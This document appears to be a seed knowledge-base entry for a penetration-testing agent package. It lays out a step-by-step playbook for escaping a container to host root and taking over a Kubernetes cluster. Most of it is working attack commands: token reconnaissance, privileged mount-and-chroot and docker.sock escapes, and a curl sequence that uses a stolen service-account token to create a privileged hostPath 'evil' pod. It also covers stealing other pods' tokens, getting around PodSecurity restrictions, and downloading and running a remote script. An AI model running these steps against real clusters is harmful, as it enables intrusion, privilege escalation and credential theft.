# [seed] Container Escape → Host Root (cap_sys_admin / Privileged Container / docker.sock)

## Scenario classification
Penetration testing / cloud native / container security

## Target overview
With a shell inside a container (through an application vulnerability / an exposed Jenkins / or RCE on K8s), escape from the container to the host and then move laterally to control the whole K8s cluster.

## Complete execution chain

1. Reconnaissance right after entering the container
   ```bash
   id                                    # root or not?
   cat /proc/self/status | grep CapEff   # check capabilities
   capsh --print                         # same, friendlier
   ls -la /var/run/docker.sock           # is the Docker socket mounted?
   mount | grep -v proc                  # which host directories are mounted
   cat /proc/1/cgroup                    # docker / containerd / kubepods?
   env | grep -i 'kube\|docker\|aws\|az' # service accounts / metadata tokens
   ls /var/run/secrets/kubernetes.io/serviceaccount/  # K8s SA token
   ```
2. Choose the escape path from the findings:

   **Path A: privileged container (`--privileged`)**
   ```bash
   # mount the host disk directly
   mkdir /host && mount /dev/sda1 /host
   chroot /host
   # you are now host root
   ```

   **Path B: cap_sys_admin / cap_dac_read_search**
   ```bash
   # release_agent bypass (CVE-2022-0492 class)
   # mount directly with cap_sys_admin
   ```

   **Path C: docker.sock mounted**
   ```bash
   docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host bash
   ```

   **Path D: K8s SA token with excessive permissions**
   ```bash
   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
   kubectl --token=$TOKEN auth can-i --list
   # if you can create pods → start a privileged pod with hostPID/hostNetwork/hostPath to escape
   ```

   **Path E: kernel exploit (Dirty Pipe / Dirty COW / OverlayFS)**
   ```bash
   uname -a               # check the kernel version
   # pick a ready-made exploit for the matching CVE
   ```

3. After escaping, look for the next hop on the host
   - kubelet credentials (/var/lib/kubelet)
   - container runtime socket (containerd / dockerd)
   - tokens of other pods
   - hostNetwork → direct access to every service IP in the cluster
4. Spread laterally across the whole K8s

## Pitfall record

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| The container runs as non-root with empty capabilities | The application layer is well hardened | Look for setuid binaries / kernel vulnerabilities / vulnerabilities outside the container | Hours |
| docker.sock visible but unreadable | The sock is root:root 660 | Add the current uid to the docker group (if there is a setgid program) or use another container | 30min |
| Privileged pod started but the image download fails | Intranet cluster with an internal docker registry | Use an image already in the cluster (pick any under kube-system) | 20min |
| K8s SA token has no permissions | The default SA is usually default/restricted | Try list pods → find a pod with cluster-admin → steal its SA token | 1h |
| No common tools after chroot | The host is a minimal distribution | Mount /proc /dev /sys before chroot; or operate on /host directly in the original ns | 30min |
| The cluster has PodSecurity Standards | The restricted policy forbids hostPath / privileged | Check for namespaces with loose admission configuration; find an SA with deployment creation rights | Hours |

## Toolchain findings

- **deepce** automated container escape detection (one sh script, no dependencies)
- **kdigger** Kubernetes/container reconnaissance tool with structured output
- **peirates** dedicated K8s penetration TUI
- **kube-hunter** from Aqua, scans clusters for security problems
- **botb (break out the box)** veteran container escape tool
- **cdk** Swiss army knife for container penetration (a Chinese project covering Chinese cloud vendor scenarios)

## Key code/commands

One-click self-check:

```bash
# pull deepce (depends on nothing)
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
chmod +x deepce.sh
./deepce.sh
# output: N escape paths detected
```

Escaping by starting a privileged pod with a K8s SA token:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# check permissions
curl -sk --header "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -d '{"spec":{"namespace":"default"}}'

# if you can create pods, mount the host with hostPath
cat <<EOF > evil-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: evil
    image: alpine
    command: ["/bin/sh","-c","sleep 999999"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

curl -sk --header "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  -X POST $APISERVER/api/v1/namespaces/default/pods \
  --data-binary @evil-pod.yaml

# then exec into the evil pod and chroot /host
```

CVE-2022-0492 exploitation (cap_sys_admin + no user namespace):

```bash
# see https://github.com/PaloAltoNetworks/cve-2022-0492
# core: mount cgroup → write release_agent → trigger an empty cgroup → execute in the host context
```

## Improvement suggestions for this package

- `CTF-Sandbox-Orchestrator/competition-agent-cloud/` already exists; suggest adding `references/k8s-attack-paths.md`
- Add a complete example path "container escape → cluster takeover" to attack-chain
- Add deepce / kdigger / peirates to the bootstrap-manifest

## Reusable patterns/script snippets

**Container escape five-path quick reference**:

```text
1. Privileged container           → mount /dev/sda1 /host && chroot /host
2. cap_sys_admin     → CVE-2022-0492 (release_agent) / mount cgroup yourself
3. docker.sock       → docker run -v /:/host alpine chroot /host
4. K8s SA + permissions     → start a hostPath/privileged pod
5. kernel CVE        → DirtyPipe (CVE-2022-0847) / DirtyCred (CVE-2022-2588) / OverlayFS (CVE-2023-0386)
```

**Must check after escaping**:

```text
- /var/lib/kubelet/pods/        → steal other pods' SA tokens
- /var/lib/docker/              → see the list of running containers
- ip addr                        → access service IPs directly with hostNetwork
- crictl ps                      → containerd container list
- ps -ef --forest                → find kubelet / dockerd startup arguments (including tokens)
```

## Evolution actions
- [ ] Add k8s-attack-paths.md to CTF-Sandbox-Orchestrator/competition-agent-cloud
- [ ] Add the container escape → cluster takeover path to attack-chain
- [ ] Add deepce/kdigger/peirates to the bootstrap-manifest

## Environment information
- Attack position: inside the container (any shell entry works)
- Target: K8s 1.24+ / Docker 20+ / containerd 1.6+
- Kernel: depends on the target; watch the CVE-2022-0492 / CVE-2022-0847 / CVE-2023-0386 time windows

## Redaction requirements
This entry is seed data, written from public container/K8s security research, with no real cluster involved.
